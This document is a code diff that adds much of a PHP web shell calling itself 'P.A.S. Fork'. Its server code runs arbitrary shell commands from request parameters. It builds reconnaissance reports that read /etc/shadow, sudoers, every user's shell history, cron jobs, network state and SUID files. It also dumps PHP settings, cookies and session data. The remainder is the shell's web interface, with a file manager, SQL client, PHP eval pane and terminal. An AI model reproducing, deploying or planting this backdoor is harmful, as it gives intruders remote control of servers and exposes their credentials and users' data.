+                $t = "echo ' -------------------------------------------------';";
+                $h = 'echo;echo;' . $t . "echo '|'  ";
+                $v = "echo '*  This report created by P.A.S. Fork v." . VER . "';echo '*  '`date -u +'%Y-%m-%d %H:%M:%S %Z'`;";
+                if (strpos($i, 'o') === FALSE)
+                    $v .= $h . 'OS Identification;' . $t . "echo '==> uname <==';" . 'uname -a;echo;tail -n +1 /proc/*version* /etc/*issue* /etc/*release* /etc/*version* /etc/motd;';
+                if (strpos($i, 'e') === FALSE)
+                    $v .= $h . 'Environment;' . $t . 'env;';
+                if (strpos($i, 'u') === FALSE)
+                    $v .= $h . 'Users and Groups;' . $t . "echo '==> id <==';" . 'id;echo;' . "echo '==> whoami <==';" . 'whoami;echo;tail -n +1 /etc/*passwd* /etc/*group* /etc/*shadow* /etc/sudoers;echo;' . "echo '==> who <==';" . 'who;';
+                if (strpos($i, 'l') === FALSE)
+                    $v .= $h . 'Lang;' . $t . 'php -v|head -n1;python -V 2>&1;perl -v|head -n2|tail -n1;ruby -v;gcc --version|head -n1;';
+                if (strpos($i, 'p') === FALSE)
+                    $v .= $h . 'Processes;' . $t . 'ps -uax;';
+                if (strpos($i, 'c') === FALSE)
+                    $v .= $h . 'CPU;' . $t . 'cat /proc/cpuinfo;';
+                if (strpos($i, 'n') === FALSE)
+                    $v .= $h . 'Network;' . $t . 'tail -n +1 /etc/host*;' . "echo '==> Listening ports <==';" . 'netstat -ln;' . "echo '==> IP config <==';" . 'ifconfig -a; ip a;';
+                if (strpos($i, 'r') === FALSE)
+                    $v .= $h . 'Cron;' . $t . 'tail -n +1 /etc/*crontab;' . "echo '==> Files <==';" . 'ls -al /etc/*cron*;ls -al /var/spool/cron/*;echo;';
+                if (strpos($i, 'h') === FALSE)
+                    $v .= $h . 'Histories;' . $t . 'for d in `cut -d":" -f6 /etc/passwd`;do ls -al $d/.*hist*;done;';
+                if (strpos($i, 'f') === FALSE) {
+                    $v .= $h . 'File System;' . $t . "echo '==> mount <==';mount;echo;echo '==> Disks <==';df -h;echo;echo '==> / <==';ls -al /;echo;echo '==> /boot <==';ls -al /boot;echo;echo '==> /etc <==';ls -al /etc;echo;echo '==> /tmp <==';ls -al /tmp;echo;echo '==> Libs <==';ls -al --full-time /lib*;echo;";
+                    if (strpos($i, 's') === FALSE)
+                        $v .= "echo '==> SUID Files <==';" . 'find / -type f -perm -u+s -ls;';
+                }
+            } else {
+                $t = 'echo  ------------------------------------------------- & ';
+                $h = $t . 'echo ^|  ';
+                $v .= $h . 'OS &' . $t . 'reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName & ';
+                if (strpos($i, 's') === FALSE)
+                    $v .= $h . 'System Info & ' . $t . 'systeminfo & ';
+                if (strpos($i, 'e') === FALSE)
+                    $v .= $h . 'Environment & ' . $t . 'SET & ';
+                if (strpos($i, 'u') === FALSE)
+                    $v .= $h . 'Users and Groups & ' . $t . 'NET USER & NET LOCALGROUP & NET GROUP & ';
+                if (strpos($i, 't') === FALSE)
+                    $v .= $h . 'Tasks & ' . $t . 'schtasks /v & ';
+                if (strpos($i, 't') === FALSE)
+                    $v .= $h . 'Processes & ' . $t . 'tasklist /SVC & ';
+                if (strpos($i, 'n') === FALSE)
+                    $v .= $h . 'Network & ' . $t . 'echo ==^> ipconfig ^<== & ipconfig /all & echo ==^> netstat ^<== & netstat -ano & echo ==^> Files ^<== & type %systemroot%\\system32\\drivers\\etc\\* & ';
+                if (strpos($i, 'r') === FALSE)
+                    $v .= $h . 'Share & ' . $t . 'NET SHARE & ';
+            }
+            $i = getCmdOpt($D['e'], 'f', FALSE);
+            exe($v, $D['f'], $D['s'], TRUE, $i ? ' 1>' . $i : '');
+            if ($i)
+                echo 'Report saved as ', $i, "\n";
+        } else {
+            $s = NIX ? ';' : '&';
+            $v = 'cd ' . (NIX ? nesc($D['p']) : wesc($D['p'])) . $s;
+            if ($D['e'] !== '') {
+                $v .= $D['e'];
+                if (substr($D['e'], -1) !== $s)
+                    $v .= $s;
+            }
+            $v .= 'echo ' . "\x03\x1E\x02" . $s . (NIX ? 'whoami' : 'echo %username%') . $s . 'hostname' . $s . (NIX ? 'pwd' : 'cd');
+            exe($v, $D['f'], $D['s'], !isset($D['h']));
+        }
+        sDie("\x03\x1E\x17\x04\x10");
+        break;
+    default:
+        if ($D['t'] === 'm') {
+            infMain();
+            sDie();
+        }
+        if ($D['t'] === 'p') {
+            echo '{"Configs":{';
+            $a = array();
+            $b = FALSE;
+            if (PHP_VERSION >= '5.2.4')
+                $a[] = php_ini_loaded_file();
+            if (PHP_VERSION >= '4.3')
+                $a[] = php_ini_scanned_files();
+            if ($a) {
+                $b = TRUE;
+                echo '"Loaded files":';
+                jsonEcho(implode(",\n", $a));
+            }
+            if (PHP_VERSION >= '4.2' && is_array($a = ini_get_all()))
+                foreach ($a as $k => $v) {
+                    if ($b)
+                        echo ',';
+                    else
+                        $b = TRUE;
+                    jsonEcho($k);
+                    echo ':';
+                    jsonEcho($v['local_value']);
+                }
+            echo '}';
+            echo ',"Main Constants":{';
+            $b = FALSE;
+            foreach (array(
+                'PHP_OS',
+                'PHP_WINDOWS_VERSION_MAJOR',
+                'PHP_WINDOWS_VERSION_MINOR',
+                'PHP_WINDOWS_VERSION_BUILD',
+                'PHP_WINDOWS_VERSION_SP_MAJOR',
+                'PHP_WINDOWS_VERSION_SP_MINOR',
+                'PHP_WINDOWS_VERSION_SUITEMASK',
+                'PHP_WINDOWS_VERSION_PLATFORM',
+                'PHP_WINDOWS_VERSION_PRODUCTTYPE',
+                'PHP_WINDOWS_NT_WORKSTATION',
+                'PHP_WINDOWS_NT_SERVER',
+                'PHP_WINDOWS_NT_DOMAIN_CONTROLLER',
+                'PHP_SAPI',
+                'PHP_VERSION',
+                'PHP_BINARY',
+                'PHP_PREFIX',
+                'PHP_BINDIR',
+                'PHP_LIBDIR',
+                'PHP_SHLIB_SUFFIX',
+                'PHP_EXTENSION_DIR',
+                'PHP_DATADIR',
+                'PHP_CONFIG_FILE_PATH',
+                'PHP_CONFIG_FILE_SCAN_DIR',
+                'PHP_MANDIR',
+                'DEFAULT_INCLUDE_PATH',
+                'PHP_SYSCONFDIR',
+                'PHP_LOCALSTATEDIR',
+                'DIRECTORY_SEPARATOR',
+                'PATH_SEPARATOR',
+                'PHP_MAXPATHLEN',
+                'PHP_INT_MAX',
+                'PHP_INT_SIZE',
+                'PEAR_INSTALL_DIR',
+                'PEAR_EXTENSION_DIR'
+            ) as $v)
+                if (defined($v)) {
+                    if ($b)
+                        echo ',';
+                    else
+                        $b = TRUE;
+                    echo '"', $v, '":';
+                    jsonEcho(constant($v));
+                }
+            echo '}';
+            if (is_array($a = get_loaded_extensions())) {
+                echo ',"Modules":{';
+                $b = FALSE;
+                $i = array(
+                    'DOTTED_VERSION',
+                    'VERSION',
+                    'VERSION_TEXT'
+                );
+                foreach ($a as $v) {
+                    if ($b)
+                        echo ',';
+                    else
+                        $b = TRUE;
+                    jsonEcho($v);
+                    echo ':';
+                    if (!($k = phpversion($v))) {
+                        $v = strtoupper($v);
+                        foreach ($i as $n)
+                            if (defined($v . '_' . $n)) {
+                                $k = constant($v . '_' . $n);
+                                break;
+                            }
+                    }
+                    if ($k)
+                        jsonEcho($k);
+                    else
+                        echo '""';
+                }
+                echo '}';
+            }
+            if (PHP_VERSION >= '5') {
+                echo ',"Streams":{"Transports":';
+                jsonEcho(implode(", ", stream_get_transports()));
+                echo ',"Wrappers":';
+                jsonEcho(implode(", ", stream_get_wrappers()));
+                echo ',"Filters":';
+                jsonEcho(implode(", ", stream_get_filters()));
+                echo '}';
+            }
+            $b = FALSE;
+            foreach (array(
+                '_ENV',
+                '_SERVER',
+                '_SESSION',
+                '_REQUEST',
+                '_GET',
+                '_POST',
+                '_COOKIE',
+                '_FILES',
+                'HTTP_RAW_POST_DATA',
+                'argc',
+                'argv'
+            ) as $v)
+                if (isset($$v) && count($$v) > 0) {
+                    if (!$b)
+                        echo ',"Global Variables":{';
+                    foreach ($$v as $k => $i) {
+                        if ($b)
+                            echo ',';
+                        else
+                            $b = TRUE;
+                        jsonEcho($v . '[' . $k . ']');
+                        echo ':';
+                        jsonEcho(print_r($i, TRUE));
+                    }
+                }
+            if ($b)
+                echo '}';
+            sDie('}');
+        }
+        break;
+}
+
+}
+
+ob_start();
+?>
+
+<!DOCTYPE html><html><head><link rel="icon" type="image/gif" href="data:image/ico;base64,<?php $ico = $_SERVER['DOCUMENT_ROOT'].'/favicon.ico'; echo (file_exists($ico) ? base64_encode(file_get_contents($ico)) : 'R0lGODlhEAAQAJECAMDAwAAAAP///wAAACH5BAEAAAIALAAAAAAQABAAQAIglI+pGwErgITtiWowc7D7b0iWGE7gp51qknrkemgyBxcAOw==');?>"/><meta name="referrer" content="no-referrer"/><title><?php if(isset($_SERVER['HTTP_HOST']))echo escHTML($_SERVER['HTTP_HOST']);elseif(isset($_SERVER['SERVER_NAME']))echo escHTML($_SERVER['SERVER_NAME']);?></title><style>*{box-sizing:border-box;outline:0}:focus{outline:none;}:disabled{opacity:.5}::-moz-focus-inner{padding:0;border:0}html{height:100%;padding:0 0 8px 0;background-color:#f0f0f0}body{background:#f0f0f0;position:relative;display:flex;margin:0 auto 8px auto;width:1000px;min-height:100%;font:normal 11px/1.5 Verdana,sans-serif;border:1px solid #fff;box-shadow:0 0 10px rgba(0,0,0,.5);flex-direction:column}iframe{display:none}a,a:visited{color:unset;text-decoration:none}pre{display:block}fieldset{border:1px solid #c7c7c7}table{font-size:12px;width:100%;border-collapse:collapse}th,td{padding:3px 5px;border:1px solid #dfdfdf}thead,tfoot{color:#fcfcfc;background:#7f7f7f}tbody{background:#f7f7f7}tbody tr:hover{background:#ececec}tfoot th{padding:8px 0 4px 2px;text-align:left}tfoot button{width:90px}input,select,button,textarea{margin:1px 2px;font:11px/1.4 Verdana,sans-serif;background:#eaeaea;border:1px solid #c7c7c7}label,select,button{cursor:pointer}button{padding:1px 10px;border-radius:3px}textarea{display:block;flex:1;font:13px/1.5 'Courier New',monospace;background:#fff;resize:none}input[type="text"]{padding:1px 2px;display:block;width:100%;flex:1}input[type="text"]:not(:disabled):focus{background:#fff}input[type="checkbox"]{vertical-align:text-top}input:not(:disabled):hover,select:not(:disabled):hover,button:not(:disabled):hover,input:not(:disabled):focus,select:not(:disabled):focus,button:not(:disabled):focus{background:#f0f0f0;border-color:#a7a7a7}button:not(:disabled):active{background:#e0e0e0;border-color:#a0a0a0 #d0d0d0 #d0d0d0 #a0a0a0}textarea:hover,textarea:focus{border-color:#7f7f7f}#divHdr{position:absolute;top:2px;right:4px;z-index:1}#divBody{position:relative;flex:1}#divFtr{margin:0 2px 3px 2px;clear:both}#divFtr div{flex:1 1 0}#divDtTm{text-align:center}#actLog{display:none;float:right;font-size:20px;line-height:16px}#divMsgs{position:fixed;left:0;right:0;bottom:10px;z-index:999;max-height:20%;overflow-y:auto}#divMsgs div{opacity:0.8}#divMsgs div:hover{opacity:1}.tab,:target ~ #tabInf .tab{display:inline-block;margin:5px 0 0 2px;padding:3px 15px 1px 15px;color:#707070 !important;border:1px solid #d0d0d0;border-bottom:0;border-radius:3px 3px 0 0;background:#e7e7e7}:target .tab,#tabInf .tab{position:relative;margin-bottom:-2px;padding-bottom:3px;z-index:1;color:#000 !important;background:#f7f7f7}.tabPage{display:none;float:left;width:100%;height:100%;flex-direction:column}:target .tabPage,#divInfo.tabPage{display:flex}:target ~ #tabInf>#divInfo.tabPage{display:none}.toolbar,.subbar,.panel{display:flex;border:1px solid #d0d0d0;background:#f7f7f7}.toolbar{margin:1px 0 4px 0;padding:8px 2px 5px 2px;border-width:1px 0;align-items:center;justify-content:space-between}.subbar{margin:-5px 0 4px 0;padding:2px 3px 5px 5px;border-width:0 0 1px 1px;border-radius:0 0 0 4px;align-self:flex-end}.panel{position:relative;margin:0 2px 8px 2px;padding:4px 3px}.arwUp,.arwDwn{display:inline-block;margin:0 0 2px 0;padding:0;border:solid transparent;border-width:4px 5px 4px 5px}.arwUp{border-top:0;border-bottom-color:#000}.arwDwn{border-top-color:#000;border-bottom:0}.spnChrst{display:inline-block;margin:0 0 0 4px;padding:0}.spnChrst .arwUp,.spnChrst .arwDwn{position:relative;margin:0 -16px 2px 2px}.spnChrst select{padding-left:11px}.cntrl{display:inline-block;overflow:hidden;opacity:.5;color:#000;border-radius:5px}.cntrl.arwDwn{margin:0 1px;border-width:7px 6px 0 6px;border-radius:0}.cntrl:hover,.cntrl:focus{opacity:1}.divCntrls .cntrl,#btnSrch{width:18px;height:19px}.divCntrls .cntrl{float:right;margin-top:-1px;font:normal 20px/16px Verdana,sans-serif;text-align:center}.lnkAct:hover{text-decoration:underline}.blink{animation:blink 1s steps(2,start) infinite}@keyframes blink{to{color:transparent}}.modal{display:flex;position:fixed;visibility:hidden;z-index:100;top:50%;left:50%;transform:translateX(-50%) translateY(-50%);padding:3px 3px 5px 3px;flex-direction:column;border:1px solid #fff;background:#f7f7f7;box-shadow:0 0 10px rgba(0,0,0,.5)}.divCntrls{margin-bottom:5px;user-select:none;}.spnTitle{font-weight:bold}.option{display:block;margin:0 2px 10px 2px;flex:1}.option input[type="text"]{margin:1px 0}.option select{display:block;margin:0 1px}.divMsgPrcs,.divMsgErr,.divMsgInf{margin:0 10px 10px 10px;padding:3px 3px 3px 5px;white-space:pre-wrap;border:1px solid;border-radius:3px}.divMsgPrcs{background-image:linear-gradient(#fff,#e0e0e0);border-color:#a0a0a0}.divMsgErr{background-image:linear-gradient(#fff,#ffd0d0);border-color:#ffa0a0}.divMsgInf{background-image:linear-gradient(#fff,#c0c0ff);border-color:#a0a0ff}#divStngs{width:300px}#divLog{width:80%;height:50%}#divLogCntn{overflow-y:auto}.flexRow{display:flex;align-items:center;justify-content:space-between}.unq{color:#7a6f15}#divPagePHP,#frmTrm{position:absolute;padding-bottom:30px}#btnSrch{margin-right:4px}#btnSrch:before,#btnSrch:after{content:'';display:inline-block;border:1px solid}#btnSrch:before{margin:0 0 0 2px;width:8px;height:9px;border-radius:50%}#btnSrch:after{margin:0 0 -5px 0;height:6px;transform:rotate(-45deg)}#btnFastAct{height:19px;margin-left:-4px;padding:1px 5px;border-radius:0 3px 3px 0}#btnFastAct:active{padding:2px 5px 0 5px}#frmFiles{margin:0 2px 10px 2px}#tblFiles{display:none;table-layout:fixed}#tblFiles thead th:first-of-type,#tblFiles td:first-of-type{padding:0;text-align:center}#tblFiles td:nth-of-type(3){white-space:nowrap}#tblFiles td:nth-of-type(4){text-align:right}#tblFiles td:nth-of-type(n+5){text-align:center}#txtClpbrd{position:fixed;top:-1px;left:-1px;margin:0;padding:0;width:1px;height:1px;border:0}#frmLnk,.frmFilesPrps{width:700px}#frmSrch{width:570px}#frmBuffer,.frmFile{width:800px;height:80%}.frmFile{min-width:400px;min-height:150px;overflow:auto;resize:both}.spcrFlex{border:0;flex:1}.spcr20{border:0;width:20px}.noFlex .option{flex:initial}.spnBtnSbMn{position:relative}.btnSbMn{width:75px}.divSbMn{display:none;position:absolute;top:100%;right:3px;margin-top:-1px;width:73px;z-index:1;border:1px solid #c7c7c7;background:#efefef}.aMnItm{display:block;margin:1px;padding:2px 4px}.aMnItm:hover{background:#e0e0e0}.thPth{padding:8px 0 4px 0;background:#f0f0f0}.spnPth{display:inline-block;font:14px/1.4 'Courier New',monospace}.spnPth:hover ~ .spnPth{color:#cfcfcf}.tdUp{transform:rotate(180deg)}.lnkBlck{display:block;white-space:pre-wrap;word-break:break-all;min-height:1em}.lnk:after{content:'\21B5';float:right}.mrkd{text-decoration:underline}.prm0,.prm1,.prm2,.prm3{font:12px 'Courier New',monospace}.prm0{color:red !important}.prm2{color:#2b2bb2 !important}.prm3{color:#00aa00 !important}#tabSQL .toolbar input[type="text"]{margin:1px 4px}#divSQLWrpLeft{display:none;float:left;width:25%}#divSQLWrpRight{float:right;width:75%;padding-left:5px}#divSchm{position:static;white-space:nowrap;width:100%;overflow-x:hidden}.divItm{margin-bottom:2px}.actRe{margin:0 1px -3px 0;width:16px;height:14px;font:normal 19px/10px Verdana,sans-serif;border:1px solid transparent}.aMore{margin:0 1px}/*.aMore:hover{position:absolute;padding-right:3px;border-radius:3px;background:#f7f7f7;z-index:90}*/.spnRC{position:relative;float:right;margin-left:-100%;padding-left:5px;color:#0000cc;background:rgba(247,247,247,.85)}.divLst{margin:2px 0 10px 15px}.divFldTp{height:1.5em;margin:0 0 0 18px;color:#afafaf;font-size:xx-small}.divFldTp,.divItm{text-overflow:ellipsis;overflow:hidden}#frmSQL,#frmPg{display:none}#divCptn{margin:0 4px 2px 4px;font-style:italic}#divData{margin:0 4px 4px 0;overflow:auto}#divDump{justify-content:center;align-items:center}#tblHead,#tblData{margin:0 auto;width:auto}#frmPg input[type="text"]{display:inline-block;width:auto}#frmPHP{margin-bottom:3px}.cmpsRow:before,.cmpsCol:before{margin:0 2px 0 1px;font-size:15px;line-height:0}.cmpsRow:before{content:'\2B12'}.cmpsCol:before{content:'\25E7'}#sbmPHP{margin-left:15px}#divPHP{display:flex;flex:1 1 0;overflow:hidden}#txtPHP{color:#0d0d0d;background:#fff}#prePHP{margin:2px;padding:2px 4px;flex:1 0 0;overflow:auto;background:#fff;border:1px solid #c7c7c7}#divTrm::selection{background:#f0f0f0}#divTrm,#preTrm,#inpTrm{color:#0d0d0d;font:12px/18px 'Courier New',monospace;background:#fff}#divTrm{margin:0 2px 1px 2px;padding:4px;flex:1 1 0;overflow:auto;border:1px solid #f0f0f0}#preTrm,#inpTrm{margin:0;padding:0}#preTrm{white-space:pre-wrap;-moz-tab-size:4;tab-size:4}#inpTrm{border:0}#inpTrm:focus{box-shadow:none}#tblInf{margin:4px 2px 10px 2px;width:auto}#tblInf th,#tblInf td{vertical-align:top}#tblInf th{width:1%;padding-right:10px;text-align:left;white-space:nowrap}#tblInf th:only-child{height:3em;text-align:center;vertical-align:bottom;border:none;background:#F0F0F0}#tblInf td{white-space:pre-wrap;word-break:break-all}</style>
+
+
+
+<script>HTMLSelectElement.prototype.__defineGetter__('textValue', function() {
+ return this.options[this.selectedIndex].label;
+});
+var mdlWndws = [],
+ tmShft = <?php echo time()*1000;?> - Date.now(),
+ exeFuncs = [], fmSort = [1, 1],
+ spnDtTm;
+document.addEventListener('DOMContentLoaded', function() {
+ if (sessionStorage.getItem('uiRszBody')) document.body.style.width = '100%';
+ var e = elmById('dataExe').textContent.split('\n');
+ for (var i = 0, c = e.length - 1; i < c; i += 4) {
+  var v = e[i].trimRight().split(':');
+  if(e[i + 1] && e[i + 2] && e[i + 2])
+	exeFuncs.push([v[0], v[1], e[i + 1].trimRight() + '@' + e[i + 2].trimRight(), e[i + 3].trimRight()]);
+ }
+ e = elmById('frmCstEnv');
+ if (exeFuncs.length > 0) {
+  strgRstrChck('envCstm', e.e);
+  for (var i = 0, c = exeFuncs.length, v = sessionStorage.getItem('envFunc') | 0; i < c; ++i) {
+   var opt = new Option(exeFuncs[i][1], exeFuncs[i][0]);
+   if (exeFuncs[i][0] == v) opt.selected = true;
+   e.f.add(opt);
+  }
+  strgRstrVal('envShell', e.s);
+  strgRstrVal('envIntrPth', e.i);
+  strgRstrChck('envIntrOptN', e.n);
+  strgRstrChck('envIntrOptC', e.c);
+ } else {
+  elmById('fldEnv').disabled = true;
+  e.e.disabled = true;
+ }
+ strgRstrChck('ro', 'cbRO');
+ strgRstrChck('rr', 'cbRR');
+ strgRstrChck('tm', 'cbTM');
+ strgRstrChck('oi', 'cbOI');
+ fmRestoreState();
+ sqlRestoreState();
+ phpRestoreState();
+ trmRestoreState();
+ spnDtTm = elmById('divDtTm').firstChild;
+ uiUpdDtTm();
+ setInterval(uiUpdDtTm, 1500);
+}, false);
+window.onbeforeunload = function() {
+ strgSaveBool('uiRszBody', document.body.style.width === '100%');
+ if (exeFuncs.length > 0) {
+  var e = elmById('frmCstEnv');
+  strgSaveBool('envCstm', e.e.checked);
+  strgSaveOpt('envFunc', e.f.value);
+  strgSaveStr('envShell', e.s.value);
+  strgSaveStr('envIntrPth', e.i.value);
+  strgSaveBool('envIntrOptN', e.n.checked);
+  strgSaveBool('envIntrOptC', e.c.checked);
+ }
+ strgRstrChck('ro', 'cbRO');
+ strgRstrChck('rr', 'cbRR');
+ strgRstrChck('tm', 'cbTM');
+ strgRstrChck('oi', 'cbOI');
+ fmSaveState();
+ sqlSaveState();
+ phpSaveState();
+ trmSaveState();
+};
+
+function elmById(v) {
+ return document.getElementById(v);
+}
+
+function newElm(tag, attr) {
+ var e = document.createElement(tag);
+ for (var k in attr) e[k] = attr[k];
+ return e;
+}
+
+function strgRstrVal(opt, elm) {
+ opt = sessionStorage.getItem(opt);
+ if (opt === null) return;
+ if (typeof elm === 'string') elm = elmById(elm);
+ elm.value = opt;
+}
+
+function strgRstrArr(n) {
+ var val = sessionStorage.getItem(n);
+ return val === null ? [] : JSON.parse(val);
+}
+
+function strgRstrChck(opt, elm) {
+ if (sessionStorage.getItem(opt) === null) return;
+ if (typeof elm === 'string') elm = elmById(elm);
+ elm.checked = true;
+}
+
+function uiKeyDwn(e) {
+ e = e || window.event;
+ var c = mdlWndws.length;
+ if (c === 0) return;
+ if (e.which === 27)
+  for (var i = c - 1; i >= 0; --i) {
+   if (mdlWndws[i].clientTop) return mdlWndws[i].firstChild.childNodes[1].onclick();
+  } else if (c > 1 && e.altKey === true && e.which === 84)
+   for (var i = 0; i < c; ++i)
+    if (mdlWndws[i].clientTop && i + 1 < c) {
+     mdlWndws[i].style.zIndex = (mdlWndws[c - 1].style.zIndex | 0) + 1;
+     mdlWndws.push(mdlWndws.splice(i, 1)[0]);
+     return;
+    }
+}
+
+function uiUpdDtTm() {
+ var v = new Date(Date.now() + tmShft).toISOString();
+ v = v.slice(0, 10) + ' ' + v.slice(11, 13) + '<span class="blink">:</span>' + v.slice(14, 16);
+ if (spnDtTm.innerHTML !== v) spnDtTm.innerHTML = v;
+}
+
+function strgSaveArr(n, v) {
+ if (v.length) sessionStorage.setItem(n, JSON.stringify(v));
+ else sessionStorage.removeItem(n);
+}
+
+function strgSaveBool(n, v) {
+ if (typeof v === 'string') v = elmById(v).checked;
+ if (v) sessionStorage.setItem(n, 1);
+ else sessionStorage.removeItem(n);
+}
+
+function strgSaveStr(n, v) {
+ if (v === '') sessionStorage.removeItem(n);
+ else sessionStorage.setItem(n, v);
+}
+
+function strgSaveOpt(n, v) {
+ if (v !== '' && v !== 'UTF-8') sessionStorage.setItem(n, v);
+ else sessionStorage.removeItem(n);
+}
+
+function uiRszBody() {
+ var s = document.body.style;
+ s.width = s.width === '100%' ? '' : '100%';
+ return false;
+}
+
+function uiRsz(e) {
+
+ if(typeof e === 'string') e = elmById(e);
+ 
+ var s = e.style;
+ var cr = JSON.parse(e.getAttribute('cr'));
+ 
+ if (s.width === '100%'){
+    if(typeof cr != null){
+        s.width = cr.width;
+        s.height = cr.height;
+        s.top = cr.top + (cr.height / 2);
+        s.left = cr.left + (cr.width / 2);
+    }
+    else{
+      s.width = '';
+      s.height = '';
+    }
+ }
+ else{
+	e.setAttribute('cr', JSON.stringify(e.getBoundingClientRect()));
+    s.top = s.left = '';
+    s.width = s.height = '100%';
+ }
+ 
+ return false;
+}
+
+function uiDelMsg(div) {
+ elmById('divMsgs').removeChild(div);
+ return false;
+}
+
+function setMsgTmr(div) {
+ var fnc = uiDelMsg.bind(null, div),
+  tmr = setTimeout(fnc, 5000);
+ div.onmouseover = function() {
+  clearTimeout(tmr);
+ };
+ div.onmouseout = function() {
+  tmr = setTimeout(fnc, 5000);
+ };
+}
+
+function uiClsMsg() {
+ return uiDelMsg(this.parentNode);
+}
+
+function uiMsg(msg, type) {
+ if (!type) {
+  type = 'Prcs';
+  msg += ' \u2026';
+ }
+ var div = newElm('div', {
+  className: 'divCntrls divMsg' + type
+ });
+ div.appendChild(newElm('a', {
+  href: '#',
+  className: 'cntrl',
+  textContent: '\u00D7',
+  onclick: uiClsMsg
+ }));
+ div.appendChild(document.createTextNode(msg));
+ var elm = elmById('divMsgs');
+ elm.insertBefore(div, elm.firstChild);
+ if (type !== 'Prcs') setMsgTmr(div);
+ return div;
+}
+
+function uiChngMsg(div, msg, type) {
+ div.firstChild.onclick = uiClsMsg;
+ div.lastChild.textContent = msg;
+ div.className = 'divMsg' + type;
+ setMsgTmr(div);
+ var elm = elmById('actLog').style;
+ if (elm.display !== 'inline-block') elm.display = 'inline-block';
+ elm = elmById('divLogCntn');
+ elm.insertBefore(newElm('div', {
+  className: 'divMsg' + type,
+  textContent: '(' + utsToStr(Date.now() / 1000) + ') ' + msg
+ }), elm.firstChild);
+ return false;
+}
+
+function uiNetErrMsg(div) {
+ uiChngMsg(div, 'Network error\n' + div.lastChild.textContent.slice(0, -2), 'Err');
+}
+
+function uiShwModal(elm) {
+ if (typeof elm === 'string') elm = elmById(elm);
+ if (elm.style.visibility === 'visible') return false;
+ elm.style.zIndex = mdlWndws.length === 0 ? 100 : (mdlWndws[mdlWndws.length - 1].style.zIndex | 0) + 1;
+ elm.style.visibility = 'visible';
+ mdlWndws.push(elm);
+ elm.focus();
+ return false;
+}
+
+function uiActvModal(evnt) {
+ var elm = evnt.currentTarget,
+  n = mdlWndws.indexOf(elm);
+ if (n !== -1) {
+  var i = mdlWndws.length - 1;
+  if (mdlWndws[i] !== elm) {
+   elm.style.zIndex = (mdlWndws[i].style.zIndex | 0) + 1;
+   mdlWndws.splice(n, 1);
+   mdlWndws.push(elm);
+  }
+ }
+ if (evnt.target.tagName === 'SPAN' || evnt.target.tagName === 'DIV') {
+  elm.style.cursor = 'move';
+  var dx = evnt.pageX - elm.offsetLeft,
+   dy = evnt.pageY - elm.offsetTop;
+  document.onmousemove = function(e) {
+   elm.style.left = (e.clientX - dx) + 'px';
+   elm.style.top = (e.clientY + window.pageYOffset - dy) + 'px';
+  };
+  document.onmouseup = function() {
+   document.onmousemove = null;
+   document.onmouseup = null;
+   elm.style.cursor = '';
+  };
+  evnt.preventDefault();
+  evnt.stopPropagation();
+  return false;
+ }
+}
+
+function uiClsModal(elm) {
+ if (typeof elm === 'string') elm = elmById(elm);
+ elm.style.visibility = 'hidden';
+ mdlWndws.splice(mdlWndws.indexOf(elm), 1);
+ return false;
+}
+
+function uiSlctTxt(id) {
+ var r = document.createRange(),
+  s = window.getSelection();
+ r.selectNode(elmById(id));
+ s.removeAllRanges();
+ s.addRange(r);
+}
+
+function utsToStr(v) {
+ if (v < 1) return '?';
+ v = new Date(v * 1000).toISOString();
+ return v.slice(0, 10) + ' ' + v.slice(11, 19);
+}
+
+function clnLog() {
+ elmById('actLog').style.display = 'none';
+ elmById('divLog').style.visibility = 'hidden';
+ var div = elmById('divLogCntn');
+ for (var i = div.childNodes.length - 1; i >= 0; --i) div.removeChild(div.childNodes[i]);
+ return false;
+}
+var DS = '<?php echo NIX?"/":"\\\\";?>',
+ fmBuffer = [],
+ elmTblFiles = null,
+ elmTmplFileRow = null,
+ elmPth = null,
+ fileTypes = {
+  0xE000: 'P',
+  0xD000: 'D',
+  0xC000: 's',
+  0xA000: 'l',
+  0x8000: '-',
+  0x6000: 'b',
+  0x4000: 'd',
+  0x2000: 'c',
+  0x1000: 'p'
+ };
+
+function fmSaveState() {
+ strgSaveStr('fmPath', elmPth.placeholder);
+ strgSaveArr('fmBuffer', fmBuffer);
+}
+
+function fmRestoreState() {
+ elmTblFiles = elmById('tblFiles');
+ elmTmplFileRow = elmById('tmplFileRow').content.firstChild;
+ elmPth = elmById('frmFM').p;
+ strgRstrVal('fmPath', elmPth);
+ elmPth.placeholder = elmPth.value;
+ fmBuffer = strgRstrArr('fmBuffer');
+ if (fmBuffer.length > 0) elmById('btnBufferMenu').disabled = false;
+}
+
+function uiCheckAll(id, state) {
+ var elms = elmById('frm' + id)['f[]'];
+ if (elms) {
+  if (elms.length > 0)
+   for (var i = elms.length - 1; i >= 0; --i) elms[i].checked = state;
+  else elms.checked = state;
+ }
+}
+
+function fmAjxSnd(msg, clbck, data, frm, chrst) {
+ if (!data) data = {};
+ data.a = 'f';
+ if (!('c' in data)) {
+  var cs = elmById('fmCSLoad').value;
+  if (cs !== '') data.c = cs;
+ }
+ ajxSnd(msg, clbck, frm, data, chrst ? chrst : elmById('fmCSSend').value);
+}
+
+function parseName(file) {
+ var n = file[0],
+  e = '';
+ if (file[1] === null) {
+  n = '[ ' + n + ' ]';
+  e = '[ DIR ]';
+ } else {
+  var p = n.lastIndexOf('.');
+  if (p > 0) {
+   e = n.slice(p + 1);
+   //n = n.slice(0, p);
+  }
+ }
+ file[0] = [file[0], n, e];
+}
+
+function cmprFiles(f1, f2) {
+ var [o, i] = fmSort;
+ var c1 = (i[1] ? f1[i[1]] : f1[0][i]);
+ var c2 = (i[1] ? f2[i[1]] : f2[0][i]);
+
+ var f1F = f1[1] !== null, f2F = f2[1] !== null;
+ 
+ if (f1F && f2F) {
+  if (c1 !== c2) return c1 > c2 ? 1*o : -1*o;
+ }
+ else if (f1F) return 1*o;
+ else if (f2F) return -1*o;
+ return f1[0][1] > f2[0][1] ? 1*o : -1*o;
+}
+
+function frmtSize(s) {
+ if (s === null) return '[ DIR ]';
+ if (s === -1) return '?';
+ if (s > 999) {
+  s = s.toString();
+  for (var i = s.length - 3; i > 0; i -= 3) s = s.slice(0, i) + '\u2009' + s.slice(i);
+ }
+ return s;
+}
+
+function prmsToStr(p) {
+ p |= 0;
+ if (p === 0) return '?';
+ var v = p & 0xF000;
